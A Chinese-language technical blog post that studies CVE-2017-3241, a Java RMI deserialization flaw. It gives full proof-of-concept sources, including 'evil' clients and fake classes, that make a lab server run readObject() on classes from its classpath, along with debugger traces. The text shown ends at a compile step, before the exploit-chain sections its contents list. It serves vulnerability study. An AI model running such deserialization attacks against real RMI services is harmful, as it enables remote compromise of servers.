标题: Java RMI入门(4)

创建: 2020-03-19 17:28
更新: 2020-04-04 17:53
链接: http://scz.617.cn:8/network/202003191728.txt

--------------------------------------------------------------------------

目录:

    ☆ 前言
    ☆ CVE-2017-3241详解
        1) Message.java
        2) SomeInterface.java
        3) SomeInterfaceImpl.java
        4) SomeDynamicServer.java
        5) SomeNormalClient.java
        6) 测试正常用法
        7) sun.rmi.server.UnicastRef.unmarshalValue()
        8) normal版PublicKnown.java
        9) fake版PublicKnown.java
       10) SomeEvilClient.java
       11) 测试异常用法
           11.1) PublicKnown.readObject()调用栈回溯
           11.2) 简化版调用关系
       12) 关于package的幺蛾子
           12.1) Message2.java
           12.2) SomeInterface2.java
           12.3) SomeInterface2Impl.java
           12.4) SomeDynamicServer2.java
           12.5) SomeNormalClient2.java
           12.6) normal版PublicKnown2.java
           12.7) fake版PublicKnown2.java
           12.8) SomeEvilClient2.java
           12.9) 编译
          12.10) 测试
       13) 关于AbstractPlatformTransactionManager的幺蛾子
           13.1) Message3.java
           13.2) SomeInterface3.java
           13.3) SomeInterface3Impl.java
           13.4) SomeDynamicServer3.java
           13.5) SomeNormalClient3.java
           13.6) normal版PublicKnown3.java
           13.7) fake版PublicKnown3.java
           13.8) SomeEvilClient3.java
           13.9) 编译
          13.10) 测试
       14) JtaTransactionManager利用链
           14.1) fake版JtaTransactionManager.java
           14.2) EvilClientWithJtaTransactionManager.java
           14.3) 编译
           14.4) 测试
               14.4.1) ExploitObject()调用栈回溯
               14.4.2) 用rmi-dumpregistry.nse观察周知端口
               14.4.3) 用marshalsec测试
       15) 为什么Message3需要继承AbstractPlatformTransactionManager
    ☆ 参考资源

--------------------------------------------------------------------------

☆ 前言

参看

《Java RMI入门》
http://scz.617.cn:8/network/202002221000.txt

《Java RMI入门(2)》
http://scz.617.cn:8/network/202003081810.txt

《Java RMI入门(3)》
http://scz.617.cn:8/network/202003121717.txt

《Java RMI入门(5)》
http://scz.617.cn:8/network/202003241127.txt

《Java RMI入门(6)》
http://scz.617.cn:8/network/202004011650.txt

☆ CVE-2017-3241详解

参[47]，中国人的原创漏洞，这个洞很骚包，发现者可以啊。Oracle给了9分，据说
受影响版本:

<= 6u131
<= 7u121
<= 8u112

后面的PoC用到了如下库:

spring-tx-4.2.4.RELEASE.jar
spring-beans-4.2.4.RELEASE.jar
spring-core-4.2.4.RELEASE.jar
javax.transaction-api-1.2.jar
commons-logging-1.2.jar
spring-context-4.2.4.RELEASE.jar

本章记录学习过程中掉进去的那些坑。

1) Message.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g Message.java
 */
import java.io.*;

/*
 * 必须实现Serializable接口
 */
class Message implements Serializable
{
    private static final long   serialVersionUID    = 0x5120131473637a00L;

    private String  msg;

    public Message ()
    {
    }

    public Message ( String msg )
    {
        this.msg    = msg;
    }

    public String getMsg ()
    {
        return( this.msg );
    }

    public void setMsg ( String msg )
    {
        this.msg    = msg;
    }
}
--------------------------------------------------------------------------

2) SomeInterface.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g SomeInterface.java
 */
import java.rmi.*;

public interface SomeInterface extends Remote
{
    /*
     * Echo形参是Object，不是Primitive类型
     */
    public String Echo ( Message sth ) throws RemoteException;
}
--------------------------------------------------------------------------

为了演示CVE-2017-3241，Echo()形参类型必须是Object或其子类，不能是Primitive
类型，这样才有机会触发反序列化操作。Message就是一种Object类型。

String也是一种Object，java.lang.String是这么定义的:

public final class String implements Serializable, Comparable<String>, CharSequence

但对于CVE-2017-3241来说，如果Echo()形参是String类型，无法攻击它。String有
final修饰符，无法自定义一个类去继承String，否则编译报错:

cannot inherit from final String

攻击跟继承有何关系？后面会解释。

上面关于String的讨论是我初次接触CVE-2017-3241时的无知讨论，是错误的。后面
会在"CVE-2017-3241进阶"中演示如何攻击Echo()形参是String类型时的情形。也就
是说，不需要弄个Message类型出来。

3) SomeInterfaceImpl.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g SomeInterfaceImpl.java
 */
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class SomeInterfaceImpl extends UnicastRemoteObject implements SomeInterface
{
    /*
     * 跟Message的不同
     */
    private static final long   serialVersionUID    = 0x5120131473637a01L;

    protected SomeInterfaceImpl () throws RemoteException
    {
        super();
    }

    @Override
    public String Echo ( Message sth ) throws RemoteException
    {
        return( "[" + sth.getMsg() + "]" );
    }
}
--------------------------------------------------------------------------

4) SomeDynamicServer.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g SomeDynamicServer.java
 */
import javax.naming.*;

/*
 * Dynamic是强调这里只有动态端口部分，周知端口部分被分离了
 */
public class SomeDynamicServer
{
    public static void main ( String[] argv ) throws Exception
    {
        String          name    = argv[0];
        /*
         * 保持一般性，使用JNDI，用JVM参数传递env
         */
        Context         ctx     = new InitialContext();
        SomeInterface   some    = new SomeInterfaceImpl();
        ctx.rebind( name, some );
    }
}
--------------------------------------------------------------------------

5) SomeNormalClient.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g SomeNormalClient.java
 */
import javax.naming.*;

public class SomeNormalClient
{
    public static void main ( String[] argv ) throws Exception
    {
        String          name    = argv[0];
        String          sth     = argv[1];
        /*
         * 保持一般性，使用JNDI，用JVM参数传递env
         */
        Context         ctx     = new InitialContext();
        SomeInterface   some    = ( SomeInterface )ctx.lookup( name );
        String          resp    = some.Echo( new Message( sth ) );
        System.out.println( resp );
    }
}
--------------------------------------------------------------------------

6) 测试正常用法

假设目录结构是:

.
|
+---test1
|       SomeDynamicServer.class
|       SomeInterface.class
|       SomeInterfaceImpl.class
|       Message.class
|
\---test2
        SomeNormalClient.class
        SomeInterface.class
        Message.class

在test1目录执行:

rmiregistry 1099

java \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
SomeDynamicServer any

为了聚焦CVE-2017-3241，在SomeDynamicServer所在目录执行rmiregistry，减少麻
烦。

在test2目录执行:

java \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
SomeNormalClient any "msg from client"

7) sun.rmi.server.UnicastRef.unmarshalValue()

参:

http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/server/UnicastRef.java

--------------------------------------------------------------------------
/**
 * Unmarshal value from an ObjectInput source using RMI's serialization
 * format for parameters or return values.
 */
protected static Object unmarshalValue(Class<?> type, ObjectInput in)
    throws IOException, ClassNotFoundException
{
    if (type.isPrimitive()) {
        if (type == int.class) {
            return Integer.valueOf(in.readInt());
        } else if (type == boolean.class) {
            return Boolean.valueOf(in.readBoolean());
        } else if (type == byte.class) {
            return Byte.valueOf(in.readByte());
        } else if (type == char.class) {
            return Character.valueOf(in.readChar());
        } else if (type == short.class) {
            return Short.valueOf(in.readShort());
        } else if (type == long.class) {
            return Long.valueOf(in.readLong());
        } else if (type == float.class) {
            return Float.valueOf(in.readFloat());
        } else if (type == double.class) {
            return Double.valueOf(in.readDouble());
        } else {
            throw new Error("Unrecognized primitive type: " + type);
        }
    } else {
        /*
         * 322行。jfeiyi在CVE-2017-3241中指出，如果RMI远程接口中的函数形参
         * 类型是Object，服务端流程会经过此处。
         */
        return in.readObject();
    }
}
--------------------------------------------------------------------------

Echo()的形参类型是Object，理论上服务端流程会经过前述322行。调试服务端:

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
SomeDynamicServer any

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in sun.rmi.server.UnicastRef.unmarshalValue
stop at sun.rmi.server.UnicastRef:322

  [1] sun.rmi.server.UnicastRef.unmarshalValue (UnicastRef.java:322), pc = 170
  [2] sun.rmi.server.UnicastServerRef.unmarshalParametersUnchecked (UnicastServerRef.java:629), pc = 31
  [3] sun.rmi.server.UnicastServerRef.unmarshalParameters (UnicastServerRef.java:617), pc = 23
  [4] sun.rmi.server.UnicastServerRef.dispatch (UnicastServerRef.java:338), pc = 168
  [5] sun.rmi.transport.Transport$1.run (Transport.java:200), pc = 23
  [6] sun.rmi.transport.Transport$1.run (Transport.java:197), pc = 1
  [7] java.security.AccessController.doPrivileged (native method)
  [8] sun.rmi.transport.Transport.serviceCall (Transport.java:196), pc = 157
  [9] sun.rmi.transport.tcp.TCPTransport.handleMessages (TCPTransport.java:573), pc = 185
  [10] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0 (TCPTransport.java:834), pc = 696
  [11] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0 (TCPTransport.java:688), pc = 1
  [12] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$4.1302121069.run (null), pc = 4
  [13] java.security.AccessController.doPrivileged (native method)
  [14] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run (TCPTransport.java:687), pc = 58
  [15] java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1,149), pc = 95
  [16] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:624), pc = 5
  [17] java.lang.Thread.run (Thread.java:748), pc = 11

8) normal版PublicKnown.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g PublicKnown.java
 */
import java.io.*;

/*
 * 假设这是在服务端正常存在且位于CLASSPATH中的类
 */
public class PublicKnown implements Serializable
{
    /*
     * 与Message、SomeInterfaceImpl不同
     */
    private static final long   serialVersionUID    = 0x5120131473637a02L;

    /*
     * 所找PublicKnown必须有实现这个函数，否则无法利用CVE-2017-3241漏洞
     */
    private void readObject ( ObjectInputStream ois )
        throws IOException, ClassNotFoundException
    {
        System.out.println( "PublicKnown.readObject()" );
        ois.defaultReadObject();
    }
}
--------------------------------------------------------------------------

看过不少讲这种传统Java反序列化的文章会说"覆写readObject"，或者
"重载readObject"。这得喷一段，PublicKnown.readObject()与
ObjectInputStream.readObject()函数原型不一样，二者之间不存在继承重载或实现
接口之类的关系，只不过函数名一样罢了。不存在所谓覆写重载，这只是个约定好的
magic机制，没见PublicKnown.readObject()是private的吗。有人纠正过这事，架不
住一代代SB前赴后继抄来抄去啊。

9) fake版PublicKnown.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g PublicKnown.java
 */

/*
 * 这是fake版PublicKnown，不会出现在服务端，只在恶意客户端存在
 */
public class PublicKnown extends Message
{
    /*
     * fake版与normal版该值必须相同
     */
    private static final long   serialVersionUID    = 0x5120131473637a02L;
}
--------------------------------------------------------------------------

10) SomeEvilClient.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g SomeEvilClient.java
 */
import javax.naming.*;

public class SomeEvilClient
{
    public static void main ( String[] argv ) throws Exception
    {
        String          name    = argv[0];
        String          sth     = argv[1];
        /*
         * 保持一般性，使用JNDI，用JVM参数传递env
         */
        Context         ctx     = new InitialContext();
        SomeInterface   some    = ( SomeInterface )ctx.lookup( name );
        /*
         * 使用fake版PublicKnown
         */
        PublicKnown     p       = new PublicKnown();
        p.setMsg( sth );
        String          resp    = some.Echo( p );
        System.out.println( resp );
    }
}
--------------------------------------------------------------------------

fake版PublicKnown继承Message，然后在SomeEvilClient中使用fake版PublicKnown。
这样客户端就能通知服务端，我有使用PublicKnown，你丫赶紧找PublicKnown来？什
么，上哪找？当然在服务端的CLASSPATH中找啊。

fake版PublicKnown只起一个通知作用，只用到了名字和serialVersionUID，因此并
不需要其他复杂实现。

11) 测试异常用法

假设目录结构是:

.
|
+---test1
|       SomeDynamicServer.class
|       SomeInterface.class
|       SomeInterfaceImpl.class
|       Message.class
|       PublicKnown.class (normal版)
|
\---test2
        SomeEvilClient.class
        SomeInterface.class
        Message.class
        PublicKnown.class (fake版)

在test1目录执行:

rmiregistry 1099

java \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
SomeDynamicServer any

在test2目录执行:

java \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
SomeEvilClient any "msg from client"

Exception in thread "main" java.lang.IllegalArgumentException: argument type mismatch
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:357)
        at sun.rmi.transport.Transport$1.run(Transport.java:200)
        at sun.rmi.transport.Transport$1.run(Transport.java:197)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:573)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:834)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:688)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:687)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
        at java.lang.Thread.run(Thread.java:748)
        at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:303)
        at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:279)
        at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:161)
        at java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod(RemoteObjectInvocationHandler.java:227)
        at java.rmi.server.RemoteObjectInvocationHandler.invoke(RemoteObjectInvocationHandler.java:179)
        at com.sun.proxy.$Proxy0.Echo(Unknown Source)
        at SomeEvilClient.main(SomeEvilClient.java:22)

客户端不会得到正常返回，抛出异常。服务端输出:

PublicKnown.readObject()

normal版PublicKnown.readObject()被调用了。SomeDynamicServer并未使用normal
版PublicKnown，PublicKnown.class仅仅出现在SomeDynamicServer的CLASSPATH中，
通过SomeEvilClient，SomeDynamicServer间接执行了PublicKnown.readObject()。
如果normal版PublicKnown本身存在反序列化漏洞，意味着客户端可以远程触发服务
端的反序列化漏洞。太猥琐了，这种洞我喜欢。

用8u232测试成功。起初以为8u112之后不让这么搞了，那Oracle是咋修补的？

若客户端PublicKnown的serialVersionUID跟服务端PublicKnown的serialVersionUID
不同，客户端会抛另一种异常，提示:

java.io.InvalidClassException: PublicKnown; local class incompatible: \
stream classdesc serialVersionUID = <wrong>, \
local class serialVersionUID = <correct>

<wrong>对应客户端serialVersionUID，<correct>对应服务端serialVersionUID。

11.1) PublicKnown.readObject()调用栈回溯

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
SomeDynamicServer any

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in PublicKnown.readObject

  [1] PublicKnown.readObject (PublicKnown.java:22), pc = 0
  [2] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [3] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [4] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [5] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [6] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,170), pc = 24
  [7] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,177), pc = 119
  [8] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
  [9] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
  [10] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
  [11] sun.rmi.server.UnicastRef.unmarshalValue (UnicastRef.java:322), pc = 171
  [12] sun.rmi.server.UnicastServerRef.unmarshalParametersUnchecked (UnicastServerRef.java:629), pc = 31
  [13] sun.rmi.server.UnicastServerRef.unmarshalParameters (UnicastServerRef.java:617), pc = 23
  [14] sun.rmi.server.UnicastServerRef.dispatch (UnicastServerRef.java:338), pc = 168
  [15] sun.rmi.transport.Transport$1.run (Transport.java:200), pc = 23
  [16] sun.rmi.transport.Transport$1.run (Transport.java:197), pc = 1
  [17] java.security.AccessController.doPrivileged (native method)
  [18] sun.rmi.transport.Transport.serviceCall (Transport.java:196), pc = 157
  [19] sun.rmi.transport.tcp.TCPTransport.handleMessages (TCPTransport.java:573), pc = 185
  [20] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0 (TCPTransport.java:834), pc = 696
  [21] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0 (TCPTransport.java:688), pc = 1
  [22] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$4.1873373936.run (null), pc = 4
  [23] java.security.AccessController.doPrivileged (native method)
  [24] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run (TCPTransport.java:687), pc = 58
  [25] java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1,149), pc = 95
  [26] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:624), pc = 5
  [27] java.lang.Thread.run (Thread.java:748), pc = 11

11.2) 简化版调用关系

参:

http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/server/UnicastServerRef.java

--------------------------------------------------------------------------
TCPTransport.handleMessages                     // 8u232
  Transport.serviceCall
    UnicastServerRef.dispatch
      UnicastServerRef.oldDispatch              // UnicastServerRef:301
                                                // 本例不会走这个流程
        RegistryImpl_Skel.dispatch
          RegistryImpl.checkAccess              // 8u232的简置检查，本例不会至此
      UnicastServerRef.unmarshalCustomCallData  // UnicastServerRef:337
                                                // 这里面有过滤器检查
      UnicastServerRef.unmarshalParameters      // UnicastServerRef:338
        UnicastServerRef.unmarshalParametersUnchecked
          UnicastRef.unmarshalValue
            ObjectInputStream.readObject
              PublicKnown.readObject
--------------------------------------------------------------------------

12) 关于package的幺蛾子

前面为了演示方便，没有使用package。测试"JtaTransactionManager利用链"时需要
"import Message;"，但javac不认这个语法，至少要有一个"."。没办法，只好新搞
一批演示代码。

上面关于package的讨论是我初次接触CVE-2017-3241时的无知讨论，是错误的。后面
会在"CVE-2017-3241进阶"中演示不使用package也可以。

12.1) Message2.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g any/Message2.java
 */
package any;

import java.io.*;

/*
 * 在本次演示方案中，必须是public的
 */
public class Message2 implements Serializable
{
    private static final long   serialVersionUID    = 0x5120131473637a00L;

    private String  msg;

    public Message2 ()
    {
    }

    public Message2 ( String msg )
    {
        this.msg    = msg;
    }

    public String getMsg ()
    {
        return( this.msg );
    }

    public void setMsg ( String msg )
    {
        this.msg    = msg;
    }
}
--------------------------------------------------------------------------

12.2) SomeInterface2.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g SomeInterface2.java
 */
import java.rmi.*;
import any.Message2;

public interface SomeInterface2 extends Remote
{
    public String Echo ( Message2 sth ) throws RemoteException;
}
--------------------------------------------------------------------------

12.3) SomeInterface2Impl.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g SomeInterface2Impl.java
 */
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import any.Message2;

public class SomeInterface2Impl extends UnicastRemoteObject implements SomeInterface2
{
    private static final long   serialVersionUID    = 0x5120131473637a01L;

    /*
     * 在本次演示方案中，不再是protected
     */
    public SomeInterface2Impl () throws RemoteException
    {
        super();
    }

    @Override
    public String Echo ( Message2 sth ) throws RemoteException
    {
        return( "[" + sth.getMsg() + "]" );
    }
}
--------------------------------------------------------------------------

12.4) SomeDynamicServer2.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g SomeDynamicServer2.java
 */
import javax.naming.*;

public class SomeDynamicServer2
{
    public static void main ( String[] argv ) throws Exception
    {
        String          name    = argv[0];
        Context         ctx     = new InitialContext();
        SomeInterface2  some    = new SomeInterface2Impl();
        ctx.rebind( name, some );
    }
}
--------------------------------------------------------------------------

12.5) SomeNormalClient2.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g SomeNormalClient2.java
 */
import javax.naming.*;
import any.Message2;

public class SomeNormalClient2
{
    public static void main ( String[] argv ) throws Exception
    {
        String          name    = argv[0];
        String          sth     = argv[1];
        Context         ctx     = new InitialContext();
        SomeInterface2  some    = ( SomeInterface2 )ctx.lookup( name );
        String          resp    = some.Echo( new Message2( sth ) );
        System.out.println( resp );
    }
}
--------------------------------------------------------------------------

12.6) normal版PublicKnown2.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g normal/PublicKnown2.java
 */
package other;

import java.io.*;

/*
 * normal版PublicKnown2
 */
public class PublicKnown2 implements Serializable
{
    private static final long   serialVersionUID    = 0x5120131473637a02L;

    private void readObject ( ObjectInputStream ois )
        throws IOException, ClassNotFoundException
    {
        System.out.println( "PublicKnown2.readObject()" );
        ois.defaultReadObject();
    }
}
--------------------------------------------------------------------------

12.7) fake版PublicKnown2.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g fake/PublicKnown2.java
 */
package other;

import any.Message2;

/*
 * fake版PublicKnown2
 */
public class PublicKnown2 extends Message2
{
    private static final long   serialVersionUID    = 0x5120131473637a02L;
}
--------------------------------------------------------------------------

12.8) SomeEvilClient2.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g SomeEvilClient2.java
 */
import javax.naming.*;
import other.PublicKnown2;

public class SomeEvilClient2
{
    public static void main ( String[] argv ) throws Exception
    {
        String          name    = argv[0];
        String          sth     = argv[1];
        Context         ctx     = new InitialContext();
        SomeInterface2  some    = ( SomeInterface2 )ctx.lookup( name );
        /*
         * 使用fake版PublicKnown2
         */
        PublicKnown2    p       = new PublicKnown2();
        p.setMsg( sth );
        String          resp    = some.Echo( p );
        System.out.println( resp );
    }
}
--------------------------------------------------------------------------

12.9) 编译

假设目录结构是:

.
|
|   SomeDynamicServer2.class
|   SomeDynamicServer2.java
|   SomeEvilClient2.class
|   SomeEvilClient2.java
|   SomeInterface2.class
|   SomeInterface2.java
|   SomeInterface2Impl.class
|   SomeInterface2Impl.java
|   SomeNormalClient2.class
|   SomeNormalClient2.java
|
+---any
|       Message2.class
|       Message2.java
|
+---fake
|       PublicKnown2.class (fake版)
|       PublicKnown2.java
|
+---normal
|       PublicKnown2.class (normal版)
|       PublicKnown2.java
|
\---other
        PublicKnown2.class (fake版)

编译:

javac -encoding GBK -g any/Message2.java
javac -encoding GBK -g SomeInterface2.java
javac -encoding GBK -g SomeInterface2Impl.java
javac -encoding GBK -g SomeDynamicServer2.java
javac -encoding GBK -g SomeNormalClient2.java
javac -encoding GBK -g normal/PublicKnown2.java
javac -encoding GBK -g fake/PublicKnown2.java
javac -encoding GBK -g SomeEvilClient2.java

12.10) 测试

假设目录结构是:

.
|
+---test1
|   |   SomeDynamicServer2.class
|   |   SomeInterface2.class
|   |   SomeInterface2Impl.class
|   |
|   +---any
|   |       Message2.class
|   |
|   \---other
|           PublicKnown2.class (normal版)
|
\---test2
    |   SomeEvilClient2.class
    |   SomeInterface2.class
    |   SomeNormalClient2.class
    |
    +---any
    |       Message2.class
    |
    \---other
            PublicKnown2.class (fake版)

在test1目录执行:

rmiregistry 1099

java \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
SomeDynamicServer2 any

在test2目录执行:

java \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
SomeNormalClient2 any "msg from client"

java \
-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
SomeEvilClient2 any "msg from client"

13) 关于AbstractPlatformTransactionManager的幺蛾子

Message、PublicKnown已将漏洞原理讲透了，Message2、PublicKnown2只是为了让演
示更贴近现实世界。很不幸，想演示如何在这个漏洞中使用JtaTransactionManager，
不能用Message2。与这个洞本身没啥关系，仅仅是JtaTransactionManager利用链不
适用于Message2，关于这点，吃亏之后通过调试才意识到的，后面会细说。新搞一批
演示代码。

13.1) Message3.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar" any/Message3.java
 */
package any;

import org.springframework.transaction.support.*;
import org.springframework.transaction.TransactionDefinition;

/*
 * 在本次演示方案中，必须是public的，必须继承AbstractPlatformTransactionManager
 */
public class Message3 extends AbstractPlatformTransactionManager
{
    private static final long   serialVersionUID    = 0x5120131473637a00L;

    private String  msg;

    public Message3 ()
    {
    }

    public Message3 ( String msg )
    {
        this.msg    = msg;
    }

    public String getMsg ()
    {
        return( this.msg );
    }

    public void setMsg ( String msg )
    {
        this.msg    = msg;
    }

    /*
     * 后面这些函数是继承AbstractPlatformTransactionManager时必须重载的，
     * 否则编译报错，这就是代价。我是按编译报错提示依次增加的。
     */

    @Override
    protected void doRollback ( DefaultTransactionStatus status )
    {
    }

    @Override
    protected void doCommit ( DefaultTransactionStatus status )
    {
    }

    @Override
    protected void doBegin ( Object transaction, TransactionDefinition definition )
    {
    }

    @Override
    protected Object doGetTransaction ()
    {
        return null;
    }
}
--------------------------------------------------------------------------

13.2) SomeInterface3.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g SomeInterface3.java
 */
import java.rmi.*;
import any.Message3;

public interface SomeInterface3 extends Remote
{
    public String Echo ( Message3 sth ) throws RemoteException;
}
--------------------------------------------------------------------------

13.3) SomeInterface3Impl.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:." SomeInterface3Impl.java
 */
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import any.Message3;

public class SomeInterface3Impl extends UnicastRemoteObject implements SomeInterface3
{
    private static final long   serialVersionUID    = 0x5120131473637a01L;

    /*
     * 在本次演示方案中，不再是protected
     */
    public SomeInterface3Impl () throws RemoteException
    {
        super();
    }

    @Override
    public String Echo ( Message3 sth ) throws RemoteException
    {
        return( "[" + sth.getMsg() + "]" );
    }
}
--------------------------------------------------------------------------

13.4) SomeDynamicServer3.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g SomeDynamicServer3.java
 */
import javax.naming.*;

public class SomeDynamicServer3
{
    public static void main ( String[] argv ) throws Exception
    {
        String          name    = argv[0];
        Context         ctx     = new InitialContext();
        SomeInterface3  some    = new SomeInterface3Impl();
        ctx.rebind( name, some );
    }
}
--------------------------------------------------------------------------

13.5) SomeNormalClient3.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g SomeNormalClient3.java
 */
import javax.naming.*;
import any.Message3;

public class SomeNormalClient3
{
    public static void main ( String[] argv ) throws Exception
    {
        String          name    = argv[0];
        String          sth     = argv[1];
        Context         ctx     = new InitialContext();
        SomeInterface3  some    = ( SomeInterface3 )ctx.lookup( name );
        String          resp    = some.Echo( new Message3( sth ) );
        System.out.println( resp );
    }
}
--------------------------------------------------------------------------

13.6) normal版PublicKnown3.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g normal/PublicKnown3.java
 */
package other;

import java.io.*;

/*
 * normal版PublicKnown3
 */
public class PublicKnown3 implements Serializable
{
    private static final long   serialVersionUID    = 0x5120131473637a02L;

    private void readObject ( ObjectInputStream ois )
        throws IOException, ClassNotFoundException
    {
        System.out.println( "PublicKnown3.readObject()" );
        ois.defaultReadObject();
    }
}
--------------------------------------------------------------------------

13.7) fake版PublicKnown3.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:spring-core-4.2.4.RELEASE.jar:." fake/PublicKnown3.java
 */
package other;

import any.Message3;

/*
 * fake版PublicKnown3
 */
public class PublicKnown3 extends Message3
{
    private static final long   serialVersionUID    = 0x5120131473637a02L;
}
--------------------------------------------------------------------------

13.8) SomeEvilClient3.java

--------------------------------------------------------------------------
/*
 * javac -encoding GBK -g -cp "spring-tx-4.2.4.RELEASE.jar:." SomeEvilClient3.java
 */
import javax.naming.*;
import other.PublicKnown3;

public class SomeEvilClient3
{
    public static void main ( String[] argv ) throws Exception
    {
        String          name    = argv[0];
        String          sth     = argv[1];
        Context         ctx     = new InitialContext();
        SomeInterface3  some    = ( SomeInterface3 )ctx.lookup( name );
        /*
         * 使用fake版PublicKnown3
         */
        PublicKnown3    p       = new PublicKnown3();
        p.setMsg( sth );
        String          resp    = some.Echo( p );
        System.out.println( resp );
    }
}
--------------------------------------------------------------------------

13.9) 编译

假设目录结构是:

.
|
|   SomeDynamicServer3.class
|   SomeDynamicServer3.java
|   SomeEvilClient3.class
|   SomeEvilClient3.java
|   SomeInterface3.class
|   SomeInterface3.java
|   SomeInterface3Impl.class
|   SomeInterface3Impl.java
|   SomeNormalClient3.class
|   SomeNormalClient3.java
|   spring-tx-4.2.4.RELEASE.jar
